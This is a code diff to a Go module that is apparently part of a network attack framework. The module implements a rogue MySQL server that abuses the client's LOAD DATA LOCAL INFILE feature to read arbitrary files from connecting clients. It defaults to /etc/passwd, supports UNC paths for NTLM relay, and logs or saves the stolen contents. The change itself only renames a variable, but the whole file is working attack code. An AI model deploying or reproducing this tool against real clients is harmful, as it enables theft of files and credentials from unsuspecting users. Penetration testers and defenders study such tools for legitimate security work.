@@ -23,90 +23,89 @@ type MySQLServer struct {
 }
 
 func NewMySQLServer(s *session.Session) *MySQLServer {
-
-	mysql := &MySQLServer{
+	mod := &MySQLServer{
 		SessionModule: session.NewSessionModule("mysql.server", s),
 	}
 
-	mysql.AddParam(session.NewStringParameter("mysql.server.infile",
+	mod.AddParam(session.NewStringParameter("mysql.server.infile",
 		"/etc/passwd",
 		"",
 		"File you want to read. UNC paths are also supported."))
 
-	mysql.AddParam(session.NewStringParameter("mysql.server.outfile",
+	mod.AddParam(session.NewStringParameter("mysql.server.outfile",
 		"",
 		"",
 		"If filled, the INFILE buffer will be saved to this path instead of being logged."))
 
-	mysql.AddParam(session.NewStringParameter("mysql.server.address",
+	mod.AddParam(session.NewStringParameter("mysql.server.address",
 		session.ParamIfaceAddress,
 		session.IPv4Validator,
 		"Address to bind the mysql server to."))
 
-	mysql.AddParam(session.NewIntParameter("mysql.server.port",
+	mod.AddParam(session.NewIntParameter("mysql.server.port",
 		"3306",
 		"Port to bind the mysql server to."))
 
-	mysql.AddHandler(session.NewModuleHandler("mysql.server on", "",
+	mod.AddHandler(session.NewModuleHandler("mysql.server on", "",
 		"Start mysql server.",
 		func(args []string) error {
-			return mysql.Start()
+			return mod.Start()
 		}))
 
-	mysql.AddHandler(session.NewModuleHandler("mysql.server off", "",
+	mod.AddHandler(session.NewModuleHandler("mysql.server off", "",
 		"Stop mysql server.",
 		func(args []string) error {
-			return mysql.Stop()
+			return mod.Stop()
 		}))
 
-	return mysql
+	return mod
 }
 
-func (mysql *MySQLServer) Name() string {
+func (mod *MySQLServer) Name() string {
 	return "mysql.server"
 }
 
-func (mysql *MySQLServer) Description() string {
+func (mod *MySQLServer) Description() string {
 	return "A simple Rogue MySQL server, to be used to exploit LOCAL INFILE and read arbitrary files from the client."
 }
 
-func (mysql *MySQLServer) Author() string {
+func (mod *MySQLServer) Author() string {
 	return "Bernardo Rodrigues (https://twitter.com/bernardomr)"
 }
 
-func (mysql *MySQLServer) Configure() error {
+func (mod *MySQLServer) Configure() error {
 	var err error
 	var address string
 	var port int
 
-	if mysql.Running() {
+	if mod.Running() {
 		return session.ErrAlreadyStarted
-	} else if err, mysql.infile = mysql.StringParam("mysql.server.infile"); err != nil {
+	} else if err, mod.infile = mod.StringParam("mysql.server.infile"); err != nil {
 		return err
-	} else if err, mysql.outfile = mysql.StringParam("mysql.server.outfile"); err != nil {
+	} else if err, mod.outfile = mod.StringParam("mysql.server.outfile"); err != nil {
 		return err
-	} else if err, address = mysql.StringParam("mysql.server.address"); err != nil {
+	} else if err, address = mod.StringParam("mysql.server.address"); err != nil {
 		return err
-	} else if err, port = mysql.IntParam("mysql.server.port"); err != nil {
+	} else if err, port = mod.IntParam("mysql.server.port"); err != nil {
 		return err
-	} else if mysql.address, err = net.ResolveTCPAddr("tcp", fmt.Sprintf("%s:%d", address, port)); err != nil {
+	} else if mod.address, err = net.ResolveTCPAddr("tcp", fmt.Sprintf("%s:%d", address, port)); err != nil {
 		return err
-	} else if mysql.listener, err = net.ListenTCP("tcp", mysql.address); err != nil {
+	} else if mod.listener, err = net.ListenTCP("tcp", mod.address); err != nil {
 		return err
 	}
 	return nil
 }
 
-func (mysql *MySQLServer) Start() error {
-	if err := mysql.Configure(); err != nil {
+func (mod *MySQLServer) Start() error {
+	if err := mod.Configure(); err != nil {
 		return err
 	}
 
-	return mysql.SetRunning(true, func() {
-		mysql.Info("server starting on address %s", mysql.address)
-		for mysql.Running() {
-			if conn, err := mysql.listener.AcceptTCP(); err != nil {
-				mysql.Warning("error while accepting tcp connection: %s", err)
+	return mod.SetRunning(true, func() {
+		mod.Info("server starting on address %s", mod.address)
+		for mod.Running() {
+			if conn, err := mod.listener.AcceptTCP(); err != nil {
+				mod.Warning("error while accepting tcp connection: %s", err)
 				continue
 			} else {
 				defer conn.Close()
@@ -117,13 +116,13 @@ func (mysql *MySQLServer) Start() error {
 				reader := bufio.NewReader(conn)
 				read := 0
 
-				mysql.Info("connection from %s", clientAddress)
+				mod.Info("connection from %s", clientAddress)
 
 				if _, err := conn.Write(packets.MySQLGreeting); err != nil {
-					mysql.Warning("error while writing server greeting: %s", err)
+					mod.Warning("error while writing server greeting: %s", err)
 					continue
 				} else if read, err = reader.Read(readBuffer); err != nil {
-					mysql.Warning("error while reading client message: %s", err)
+					mod.Warning("error while reading client message: %s", err)
 					continue
 				}
 
@@ -134,38 +133,38 @@ func (mysql *MySQLServer) Start() error {
 				loadData := string(capabilities[8])
 				username := string(bytes.Split(readBuffer[36:], []byte{0})[0])
 
-				mysql.Info("can use LOAD DATA LOCAL: %s", loadData)
-				mysql.Info("login request username: %s", tui.Bold(username))
+				mod.Info("can use LOAD DATA LOCAL: %s", loadData)
+				mod.Info("login request username: %s", tui.Bold(username))
 
 				if _, err := conn.Write(packets.MySQLFirstResponseOK); err != nil {
-					mysql.Warning("error while writing server first response ok: %s", err)
+					mod.Warning("error while writing server first response ok: %s", err)
 					continue
 				} else if _, err := reader.Read(readBuffer); err != nil {
-					mysql.Warning("error while reading client message: %s", err)
+					mod.Warning("error while reading client message: %s", err)
 					continue
-				} else if _, err := conn.Write(packets.MySQLGetFile(mysql.infile)); err != nil {
-					mysql.Warning("error while writing server get file request: %s", err)
+				} else if _, err := conn.Write(packets.MySQLGetFile(mod.infile)); err != nil {
+					mod.Warning("error while writing server get file request: %s", err)
 					continue
 				} else if read, err = reader.Read(readBuffer); err != nil {
-					mysql.Warning("error while readind buffer: %s", err)
+					mod.Warning("error while readind buffer: %s", err)
 					continue
 				}
 
-				if strings.HasPrefix(mysql.infile, "\\") {
-					mysql.Info("NTLM from '%s' relayed to %s", clientAddress, mysql.infile)
+				if strings.HasPrefix(mod.infile, "\\") {
+					mod.Info("NTLM from '%s' relayed to %s", clientAddress, mod.infile)
 				} else if fileSize := read - 9; fileSize < 4 {
-					mysql.Warning("unpexpected buffer size %d", read)
+					mod.Warning("unpexpected buffer size %d", read)
 				} else {
-					mysql.Info("read file ( %s ) is %d bytes", mysql.infile, fileSize)
+					mod.Info("read file ( %s ) is %d bytes", mod.infile, fileSize)
 
 					fileData := readBuffer[4 : read-4]
 
-					if mysql.outfile == "" {
-						mysql.Info("\n%s", string(fileData))
+					if mod.outfile == "" {
+						mod.Info("\n%s", string(fileData))
 					} else {
-						mysql.Info("saving to %s ...", mysql.outfile)
-						if err := ioutil.WriteFile(mysql.outfile, fileData, 0755); err != nil {
-							mysql.Warning("error while saving the file: %s", err)
+						mod.Info("saving to %s ...", mod.outfile)
+						if err := ioutil.WriteFile(mod.outfile, fileData, 0755); err != nil {
+							mod.Warning("error while saving the file: %s", err)
 						}
 					}
 				}
@@ -176,8 +175,8 @@ func (mysql *MySQLServer) Start() error {
 	})
 }
 
-func (mysql *MySQLServer) Stop() error {
-	return mysql.SetRunning(false, func() {
-		defer mysql.listener.Close()
+func (mod *MySQLServer) Stop() error {
+	return mod.SetRunning(false, func() {
+		defer mod.listener.Close()
 	})
 }
